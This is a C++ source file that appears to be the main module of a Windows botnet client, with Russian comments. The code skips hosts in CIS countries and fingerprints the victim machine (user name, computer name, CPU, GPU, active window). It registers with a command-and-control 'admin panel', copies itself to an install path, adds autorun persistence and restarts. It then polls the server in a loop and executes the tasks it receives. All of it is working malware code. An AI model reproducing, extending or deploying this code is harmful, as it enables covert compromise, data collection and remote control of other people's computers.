#include "Includes/Common.h"
#include "Utils/Debug_to_file.h"
#include "BotWorks/RegBot.h"
#include "BotWorks/BotWorks.h"
#include "String/StringHelpers.h"
#include "TaskWorks/TaskWorks.h"
#include "Config.h"

static wchar_t req[1024];
static uint8_t ascii[1024 * sizeof(wchar_t)];

static BYTE DecResponse[1024];
static BYTE DecResponse_cpy[1024];

static int InstallBot(HANDLE hMutex) {

	wchar_t* currentPath = GetCurrentPath();
	if (!currentPath) return (-1);

	Install install(currentPath);
	wchar_t* installPath = install.GetInstallPath();
	if (!installPath) return (-1);

	if (API(KERNEL32, lstrcmpW)(currentPath, installPath))
	{
		if (!install.MoveToInstallPath())
		{
			hFree(currentPath);
			return (-1);
		}

		if (!install.AddAutorun())
		{
			hFree(currentPath);
			return (-1);
		}

		API(KERNEL32, ReleaseMutex)(hMutex);

		install.Restart();
	}
}

int main()
{
	API(KERNEL32, Sleep)(TIME_SLEEP);

#if IS_DEBUG
	clear_log();
#endif

#if !IS_DEBUG
	if (IsCIS()) return (-1);;
#endif

	wchar_t* botUid = GetBotUid();
	if (!botUid) {
		DEBUG_TO_FILE("Bad botUid\r");
		return -1;
	}

	HANDLE hMutex = API(KERNEL32, CreateMutexW)(nullptr, TRUE, botUid);
	if (API(KERNEL32, GetLastError)() == ERROR_ALREADY_EXISTS)
	{
		DEBUG_TO_FILE("Mutex is already exist\r");
		return 0;
	}

	//Формирование и отсылка запроса на регистрацию бота в админке
	BotInfo* botInfo = GetBotInfo();

	//Генерация строки для отправки
	API(USER32, wsprintfW)(req, L"%s|Win %d.%d %d|%s|%s|%s|%s|%d|%s|%s",
		botUid, botInfo->osVer.dwMajor, botInfo->osVer.dwMajor, botInfo->osVer.dwBuild, botInfo->userName, botInfo->compName,
		botInfo->cpuName, botInfo->gpuName, botInfo->activeWindow, botInfo->screenRes, botInfo->activeWindow);

	//Генерация строки для отправки
	UnicodeToASCII(req, (char*)ascii);
	DEBUG_TO_FILE("START BOT:%s \r", ascii);

	//Попытка регистрации бота в админке
	bool ret_code = bot_reg(req);
	if (ret_code == true) { //Регистрация прошла успешно
		DEBUG_TO_FILE("+++ Bot is reg id: %s \r\n", botUid);
		InstallBot(hMutex);
	}
	else {
		//Невозможно зарегистрировать бота, нужно самоудалиться
		DEBUG_TO_FILE("+++ Bot is reg fault id: %s \r\n", botUid);
	}

	//Основной цикл работы бота
	while (1) {

		API(KERNEL32, Sleep)(2000);

		//Формирование запроса на ping
		API(USER32, wsprintfW)(req, L"%s|", botUid);

		//Посылка запроса
		ret_code = post_send_recv_bot(hide_admin_path(), hide_ping_path(), (wchar_t*)req, DecResponse);

		if (ret_code == true) {

			strCpyA((char*)DecResponse_cpy, (const char*)DecResponse);
			
			char* recv_code = strTokA((char*)DecResponse_cpy, "|");
			if (recv_code != nullptr) {

				//Парсинг результатов
				if (!strCmpA((char*)recv_code, (char*)hide_str_reg())) {

					//Пройти регистрацию еще раз
					API(USER32, wsprintfW)(req, L"%s|Win %d.%d %d|%s|%s|%s|%s|%d|%s|%s",
						botUid, botInfo->osVer.dwMajor, botInfo->osVer.dwMajor, botInfo->osVer.dwBuild, botInfo->userName, botInfo->compName,
						botInfo->cpuName, botInfo->gpuName, botInfo->activeWindow, botInfo->screenRes, botInfo->activeWindow);

					UnicodeToASCII(req, (char*)ascii);
					DEBUG_TO_FILE("+++ Start reg bot again: %s \r\n", ascii);

					//Попытка регистрации бота в админке еще раз
					bot_reg(req);
				}
				else {

					if (!strCmpA((char*)recv_code, hide_str_task())) {
						//Выполнить задание
						parse_task_and_exec(botUid, (char*)DecResponse);
					}
				}
			}
			DEBUG_TO_FILE("+++ Bot is worked ID: %s \r\n", botUid);
		}
	}
	return 0;
}